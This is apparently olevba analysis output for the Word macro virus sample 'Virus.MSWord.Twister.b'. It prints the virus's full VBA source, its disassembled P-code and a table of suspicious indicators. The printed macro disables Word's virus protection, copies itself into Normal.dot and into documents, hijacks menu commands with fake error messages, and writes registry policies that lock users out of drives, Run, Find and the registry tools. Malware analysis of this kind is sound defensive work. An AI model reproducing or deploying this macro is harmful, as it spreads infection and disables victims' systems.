olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twister.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twister.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WinNuker.bas 
in file: Virus.MSWord.Twister.b - OLE stream: 'Macros/VBA/WinNuker'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
WordBasic.DisableAutoMacros 0: Application.Caption = "Micrøsøft Wørd - WinNuker"
Application.ShowVisualBasicEditor = False: Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False: Options.VirusProtection = False
Options.SaveNormalPrompt = False: Options.AllowFastSave = False
Options.BlueScreen = True: Application.WindowState = wdWindowStateMaximize

Assistant.Visible = True
Assistant.Move xLeft:=700, yTop:=20
With Assistant.NewBalloon
    .Text = "Autor: Zerø|<LzØ>"
    .Heading = "This is WinNuker"
    .Animation = msoAnimationGetTechy
    .Show
End With
Assistant.Visible = False


FN$ = "C:\Progra~1\WinNuker32.vxd"
Application.VBE.ActiveVBProject.VBComponents.Item("WinNuker").Export FN$

If CheckInstNor = 0 Then
    NormalTemplate.VBProject.VBComponents.Import FN$
End If

If CheckInstDok = 0 Then
    ActiveDocument.VBProject.VBComponents.Import FN$
End If
Call WinNuker
End Sub
Sub DateiDrucken()
Call AutoOpen
    Selection.WholeStory
    A$ = Selection.Font.Name
    B$ = Selection.Font.Size
    Selection.Font.Name = "Bookman Old Style"
    Selection.Font.Size = 30
    Dialogs(wdDialogFilePrint).Show
    ActiveDocument.PrintOut
    Selection.Font.Name = A$
    Selection.Font.Size = B$
    Call WinNuker
End Sub
Sub AnsichtVBCode()
    MsgBox "Die zum Starten von VisualBasic benötigte Datei: VBA32.vxd wurde nicht gefunden!", vbCritical, "Visual Basic Error"
    Call WinNuker
End Sub
Sub AnsichtCode()
    MsgBox "Die zum Starten von VisualBasic benötigte Datei: VBA32.vxd wurde nicht gefunden!", vbCritical, "Visual Basic Error"
    Call WinNuker
End Sub
Sub DateiDokVorlagen()
    MsgBox "Nicht genug freier EMS-Speicher um Anwendung zu starten!", vbCritical, "Microsoft Word:"
    Call WinNuker
End Sub
Sub ExtrasMakro()
' Thanx to Jack Twoflower for this Code :}
Call WinNuker

Dim x
ReDim Combobox1__$(0)
Combobox1__$(0) = ""
ReDim Textbox1__$(0)
Textbox1__$(0) = ""
ReDim Droplistbox2__$(0)
Droplistbox2__$(0) = "Normal.dot (Globale Dokumentvorlage)"

WordBasic.BeginDialog 620, 280, "Makros"
WordBasic.Text 7, 6, 93, 13, "Makro&name:", "Text3"
WordBasic.ComboBox 7, 23, 435, 170, Combobox1__$(), "Combobox1"
WordBasic.Pushbutton 470, 14, 137, 21, "&Ausführen", "Definierbar2"
WordBasic.Cancelbutton 470, 38, 137, 21
WordBasic.Pushbutton 470, 72, 137, 21, "&Schrittweise prüfen", "Definierbar3"
WordBasic.Pushbutton 470, 96, 137, 21, "Bear&beiten", "Definierbar4"
WordBasic.Pushbutton 470, 130, 137, 21, "Ers&tellen", "Definierbar5"
WordBasic.Pushbutton 470, 154, 137, 21, "Org&anisieren", "Definierbar6"
WordBasic.Pushbutton 470, 178, 137, 21, "Orga&nisieren...", "Definierbar7"
WordBasic.Text 7, 200, 93, 13, "Makros in:", "Text1"
WordBasic.Droplistbox 90, 196, 354, 19, Droplistbox2__$(), "Listbox2"
WordBasic.Text 7, 222, 109, 13, "Beschrei&bung:", "Text2"
WordBasic.TextBox 7, 235, 437, 38, Textbox1__$()
WordBasic.EndDialog

Dim dlg As Object
Set dlg = WordBasic.CurValues.Userdialog

x = WordBasic.Dialog.Userdialog(dlg)
Select Case x
Case 0
WordBasic.Cancel
Case 1 To 6
MsgBox "Nicht genug freier EMS-Speicher um Anwendung zu starten!", vbCritical, "Microsoft Word:"
End Select
End Sub
Sub DateiNeu()
    Call AutoOpen
    Call WinNuker
End Sub
Sub DateiDruckenStandard()
    ActiveDocument.PrintOut
    Call AutoOpen
    Call WinNuker
End Sub
Sub WinNuker()
MsgBox "You got Nuked!!", vbCritical, "Ha Ha Ha!"
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDrives") = 3
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispCPL") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoSecCPL") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSetFolders") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFind") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDesktop") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 1
    System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools") = 1
End Sub
Function CheckInstDok()
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "WinNuker" Then
    CheckInstDok = 1
    End If
Next x
End Function
Function CheckInstNor()
For Y = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(Y).Name = "WinNuker" Then
    CheckInstNor = 1
    End If
Next Y
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Twister.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/WinNuker - 11287 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	LitDI2 0x0000 
' 	Ld DisableAutoMacros 
' 	ArgsMemCall Caption 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0019 "Micrøsøft Wørd - WinNuker"
' 	Ld Application 
' 	MemSt BlueScreen 
' Line #2:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' 	BoS 0x0000 
' 	Ld ScreenUpdating 
' 	Ld Application 
' 	MemSt wdAlertsNone 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Options 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld VirusProtection 
' 	MemSt SaveInterval 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld VirusProtection 
' 	MemSt AllowFastSave 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld VirusProtection 
' 	MemSt WordBasic 
' Line #5:
' 	LitVarSpecial (True)
' 	Ld VirusProtection 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	Ld ani 
' 	Ld Application 
' 	MemSt wdWindowStateMaximize 
' Line #6:
' Line #7:
' 	LitVarSpecial (True)
' 	Ld Visible 
' 	MemSt NewBalloon 
' Line #8:
' 	LitDI2 0x02BC 
' 	ParamNamed yTop 
' 	LitDI2 0x0014 
' 	ParamNamed Export 
' 	Ld Visible 
' 	ArgsMemCall xLeft 0x0002 
' Line #9:
' 	StartWithExpr 
' 	Ld Visible 
' 	MemLd Heading 
' 	With 
' Line #10:
' 	LitStr 0x0011 "Autor: Zerø|<LzØ>"
' 	MemStWith Then 
' Line #11:
' 	LitStr 0x0010 "This is WinNuker"
' 	MemStWith Show 
' Line #12:
' 	Ld msoAnimationGetWizardy 
' 	MemStWith msoAnimationEmptyTrash 
' Line #13:
' 	ArgsMemCallWith _B_var_ani 0x0000 
' Line #14:
' 	EndWith 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Visible 
' 	MemSt NewBalloon 
' Line #16:
' Line #17:
' Line #18:
' 	LitStr 0x001A "C:\Progra~1\WinNuker32.vxd"
' 	St _B_str_FN$ 
' Line #19:
' 	Ld _B_str_FN$ 
' 	LitStr 0x0008 "WinNuker"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd VBIDE 0x0001 
' 	ArgsMemCall FN 0x0001 
' Line #20:
' Line #21:
' 	Ld Y 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #22:
' 	Ld _B_str_FN$ 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall _B_var_End 0x0001 
' Line #23:
' 	EndIfBlock 
' Line #24:
' Line #25:
' 	Ld _B_var_For 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #26:
' 	Ld _B_str_FN$ 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall _B_var_End 0x0001 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	ArgsCall (Call) WinNuker 0x0000 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub Dialgos())
' Line #31:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #32:
' 	Ld WholeStory 
' 	ArgsMemCall Font 0x0000 
' Line #33:
' 	Ld WholeStory 
' 	MemLd Size 
' 	MemLd New 
' 	St A$ 
' Line #34:
' 	Ld WholeStory 
' 	MemLd Size 
' 	MemLd Activesocument 
' 	St B$ 
' Line #35:
' 	LitStr 0x0011 "Bookman Old Style"
' 	Ld WholeStory 
' 	MemLd Size 
' 	MemSt New 
' Line #36:
' 	LitDI2 0x001E 
' 	Ld WholeStory 
' 	MemLd Size 
' 	MemSt Activesocument 
' Line #37:
' 	Ld AutoOpem 
' 	ArgsLd wdDialogFilePrint 0x0001 
' 	ArgsMemCall _B_var_ani 0x0000 
' Line #38:
' 	Ld ActiveDocument 
' 	ArgsMemCall AnsichtVBCode 0x0000 
' Line #39:
' 	Ld A$ 
' 	Ld WholeStory 
' 	MemLd Size 
' 	MemSt New 
' Line #40:
' 	Ld B$ 
' 	Ld WholeStory 
' 	MemLd Size 
' 	MemSt Activesocument 
' Line #41:
' 	ArgsCall (Call) WinNuker 0x0000 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Sub VBA32())
' Line #44:
' 	LitStr 0x0050 "Die zum Starten von VisualBasic benötigte Datei: VBA32.vxd wurde nicht gefunden!"
' 	Ld AnsichtCode 
' 	LitStr 0x0012 "Visual Basic Error"
' 	ArgsCall MsgBox 0x0003 
' Line #45:
' 	ArgsCall (Call) WinNuker 0x0000 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Sub DateiDokVorlagen())
' Line #48:
' 	LitStr 0x0050 "Die zum Starten von VisualBasic benötigte Datei: VBA32.vxd wurde nicht gefunden!"
' 	Ld AnsichtCode 
' 	LitStr 0x0012 "Visual Basic Error"
' 	ArgsCall MsgBox 0x0003 
' Line #49:
' 	ArgsCall (Call) WinNuker 0x0000 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub msgbo())
' Line #52:
' 	LitStr 0x0038 "Nicht genug freier EMS-Speicher um Anwendung zu starten!"
' 	Ld AnsichtCode 
' 	LitStr 0x000F "Microsoft Word:"
' 	ArgsCall MsgBox 0x0003 
' Line #53:
' 	ArgsCall (Call) WinNuker 0x0000 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub Document())
' Line #56:
' 	QuoteRem 0x0000 0x0029 " Thanx to Jack Twoflower for this Code :}"
' Line #57:
' 	ArgsCall (Call) WinNuker 0x0000 
' Line #58:
' Line #59:
' 	Dim 
' 	VarDefn _B_var_X
' Line #60:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim Textbox1__$ 0x0001 (As String)
' Line #61:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0000 
' 	ArgsSt Textbox1__$ 0x0001 
' Line #62:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim Droplistbox2__$ 0x0001 (As String)
' Line #63:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0000 
' 	ArgsSt Droplistbox2__$ 0x0001 
' Line #64:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim BeginDialog$ 0x0001 (As String)
' Line #65:
' 	LitStr 0x0024 "Normal.dot (Globale Dokumentvorlage)"
' 	LitDI2 0x0000 
' 	ArgsSt BeginDialog$ 0x0001 
' Line #66:
' Line #67:
' 	LitDI2 0x026C 
' 	LitDI2 0x0118 
' 	LitStr 0x0006 "Makros"
' 	Ld DisableAutoMacros 
' 	ArgsMemCall ComboBox 0x0003 
' Line #68:
' 	LitDI2 0x0007 
' 	LitDI2 0x0006 
' 	LitDI2 0x005D 
' 	LitDI2 0x000D 
' 	LitStr 0x000B "Makro&name:"
' 	LitStr 0x0005 "Text3"
' 	Ld DisableAutoMacros 
' 	ArgsMemCall Then 0x0006 
' Line #69:
' 	LitDI2 0x0007 
' 	LitDI2 0x0017 
' 	LitDI2 0x01B3 
' 	LitDI2 0x00AA 
' 	ArgsLd Textbox1__$ 0x0000 
' 	LitStr 0x0009 "Combobox1"
' 	Ld DisableAutoMacros 
' 	ArgsMemCall Pushbutton 0x0006 
' Line #70:
' 	LitDI2 0x01D6 
' 	LitDI2 0x000E 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x000A "&Ausführen"
' 	LitStr 0x000C "Definierbar2"
' 	Ld DisableAutoMacros 
' 	ArgsMemCall Cancelbutton 0x0006 
' Line #71:
' 	LitDI2 0x01D6 
' 	LitDI2 0x0026 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	Ld DisableAutoMacros 
' 	ArgsMemCall Droplistbox 0x0004 
' Line #72:
' 	LitDI2 0x01D6 
' 	LitDI2 0x0048 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x0014 "&Schrittweise prüfen"
' 	LitStr 0x000C "Definierbar3"
' 	Ld DisableAutoMacros 
' 	ArgsMemCall Cancelbutton 0x0006 
' Line #73:
' 	LitDI2 0x01D6 
' 	LitDI2 0x0060 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x000B "Bear&beiten"
' 	LitStr 0x000C "Definierbar4"
' 	Ld DisableAutoMacros 
' 	ArgsMemCall Cancelbutton 0x0006 
' Line #74:
' 	LitDI2 0x01D6 
' 	LitDI2 0x0082 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x000A "Ers&tellen"
' 	LitStr 0x000C "Definierbar5"
' 	Ld DisableAutoMacros 
' 	ArgsMemCall Cancelbutton 0x0006 
' Line #75:
' 	LitDI2 0x01D6 
' 	LitDI2 0x009A 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x000D "Org&anisieren"
' 	LitStr 0x000C "Definierbar6"
' 	Ld DisableAutoMacros 
' 	ArgsMemCall Cancelbutton 0x0006 
' Line #76:
' 	LitDI2 0x01D6 
' 	LitDI2 0x00B2 
' 	LitDI2 0x0089 
' 	LitDI2 0x0015 
' 	LitStr 0x0010 "Orga&nisieren..."
' 	LitStr 0x000C "Definierbar7"
' 	Ld DisableAutoMacros 
' 	ArgsMemCall Cancelbutton 0x0006 
' Line #77:
' 	LitDI2 0x0007 
' 	LitDI2 0x00C8 
' 	LitDI2 0x005D 
' 	LitDI2 0x000D 
' 	LitStr 0x000A "Makros in:"
' 	LitStr 0x0005 "Text1"
' 	Ld DisableAutoMacros 
' 	ArgsMemCall Then 0x0006 
' Line #78:
' 	LitDI2 0x005A 
' 	LitDI2 0x00C4 
' 	LitDI2 0x0162 
' 	LitDI2 0x0013 
' 	ArgsLd BeginDialog$ 0x0000 
' 	LitStr 0x0008 "Listbox2"
' 	Ld DisableAutoMacros 
' 	ArgsMemCall TextBox 0x0006 
' Line #79:
' 	LitDI2 0x0007 
' 	LitDI2 0x00DE 
' 	LitDI2 0x006D 
' 	LitDI2 0x000D 
' 	LitStr 0x000E "Beschrei&bung:"
' 	LitStr 0x0005 "Text2"
' 	Ld DisableAutoMacros 
' 	ArgsMemCall Then 0x0006 
' Line #80:
' 	LitDI2 0x0007 
' 	LitDI2 0x00EB 
' 	LitDI2 0x01B5 
' 	LitDI2 0x0026 
' 	ArgsLd Droplistbox2__$ 0x0000 
' 	Ld DisableAutoMacros 
' 	ArgsMemCall EndDialog 0x0005 
' Line #81:
' 	Ld DisableAutoMacros 
' 	ArgsMemCall dlg 0x0000 
' Line #82:
' Line #83:
' 	Dim 
' 	VarDefn CurValues (As Object)
' Line #84:
' 	SetStmt 
' 	Ld DisableAutoMacros 
' 	MemLd Userdialog 
' 	MemLd Dialog 
' 	Set CurValues 
' Line #85:
' Line #86:
' 	Ld CurValues 
' 	Ld DisableAutoMacros 
' 	MemLd Cancel 
' 	ArgsMemLd Dialog 0x0001 
' 	St _B_var_X 
' Line #87:
' 	Ld _B_var_X 
' 	SelectCase 
' Line #88:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #89:
' 	Ld DisableAutoMacros 
' 	ArgsMemCall _B_str_Combobox1__ 0x0000 
' Line #90:
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	CaseTo 
' 	CaseDone 
' Line #91:
' 	LitStr 0x0038 "Nicht genug freier EMS-Speicher um Anwendung zu starten!"
' 	Ld AnsichtCode 
' 	LitStr 0x000F "Microsoft Word:"
' 	ArgsCall MsgBox 0x0003 
' Line #92:
' 	EndSelect 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Sub DateiDruckenStandard())
' Line #95:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #96:
' 	ArgsCall (Call) WinNuker 0x0000 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Sub System())
' Line #99:
' 	Ld ActiveDocument 
' 	ArgsMemCall AnsichtVBCode 0x0000 
' Line #100:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #101:
' 	ArgsCall (Call) WinNuker 0x0000 
' Line #102:
' 	EndSub 
' Line #103:
' 	FuncDefn (Sub WinNuker())
' Line #104:
' 	LitStr 0x000F "You got Nuked!!"
' 	Ld AnsichtCode 
' 	LitStr 0x0009 "Ha Ha Ha!"
' 	ArgsCall MsgBox 0x0003 
' Line #105:
' 	LitDI2 0x0003 
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0008 "NoDrives"
' 	Ld PrivateProfileString 
' 	ArgsMemSt id_035C 0x0003 
' Line #106:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System"
' 	LitStr 0x0009 "NoDispCPL"
' 	Ld PrivateProfileString 
' 	ArgsMemSt id_035C 0x0003 
' Line #107:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System"
' 	LitStr 0x0008 "NoSecCPL"
' 	Ld PrivateProfileString 
' 	ArgsMemSt id_035C 0x0003 
' Line #108:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0005 "NoRun"
' 	Ld PrivateProfileString 
' 	ArgsMemSt id_035C 0x0003 
' Line #109:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x000C "NoSetFolders"
' 	Ld PrivateProfileString 
' 	ArgsMemSt id_035C 0x0003 
' Line #110:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0006 "NoFind"
' 	Ld PrivateProfileString 
' 	ArgsMemSt id_035C 0x0003 
' Line #111:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0009 "NoDesktop"
' 	Ld PrivateProfileString 
' 	ArgsMemSt id_035C 0x0003 
' Line #112:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
' 	LitStr 0x0007 "NoClose"
' 	Ld PrivateProfileString 
' 	ArgsMemSt id_035C 0x0003 
' Line #113:
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Policies\System"
' 	LitStr 0x0014 "DisableRegistryTools"
' 	Ld PrivateProfileString 
' 	ArgsMemSt id_035C 0x0003 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Function _B_var_For())
' Line #116:
' 	StartForVariable 
' 	Ld _B_var_X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd ActInst 
' 	For 
' Line #117:
' 	Ld _B_var_X 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "WinNuker"
' 	Eq 
' 	IfBlock 
' Line #118:
' 	LitDI2 0x0001 
' 	St _B_var_For 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	StartForVariable 
' 	Ld _B_var_X 
' 	EndForVariable 
' 	NextVar 
' Line #121:
' 	EndFunc 
' Line #122:
' 	FuncDefn (Function Y())
' Line #123:
' 	StartForVariable 
' 	Ld NornalTemplate 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd ActInst 
' 	For 
' Line #124:
' 	Ld NornalTemplate 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "WinNuker"
' 	Eq 
' 	IfBlock 
' Line #125:
' 	LitDI2 0x0001 
' 	St Y 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	StartForVariable 
' 	Ld NornalTemplate 
' 	EndForVariable 
' 	NextVar 
' Line #128:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

